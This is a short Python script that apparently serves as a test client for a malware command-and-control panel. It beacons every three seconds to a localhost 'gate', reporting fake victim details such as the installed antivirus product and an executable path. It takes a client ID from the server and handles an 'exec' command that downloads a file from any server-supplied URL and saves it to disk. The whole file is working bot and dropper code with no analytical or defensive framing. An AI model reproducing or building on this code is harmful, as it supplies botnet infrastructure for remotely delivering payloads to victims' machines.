import requests
from time import sleep
import requests, subprocess


json = {"cmd": "Initial Connection", "cmdOut": "NewClientPC|Avast Security|C:\\Windows\\System32\\Test.exe|6969|0.1"}
commandOutput = ""
clientId = ''

while True:
    sleep(3)

    response = requests.post("http://127.0.0.1:5959/gate", 
                             
        headers={
            "User-Agent": clientId
        },

        json=json
    )

    if response.text == "":
        print("No more commands needed")
        json = {"cmd": "", "cmdOut": ""}
        continue

    elif response.text == "lock":
        print("Gate Locked")
        continue
    
    command = str(response.text.split('|')[0].split('-')[0])
    params = response.text.split('|')[1:]

    if command == 'registered':
        clientId = params[0]
        print(f"Registered {params[0]}")
        commandOutput = f"Successfully obtained client id {params[0]}"

    elif command == "echo":
        commandOutput = "Echo command: "+params[0]

    elif command == "exec":
        response = requests.get(params[0])
        with open(params[1], 'wb') as f:
            f.write(response.content)

        commandOutput = f"File downloaded as {params[1]} from {params[0]}, but didn't execute (linux lol)"

    else:
        print("Unsupported command")
        commandOutput = "Unsupported command"

    json = {"cmd": command, "cmdOut": commandOutput}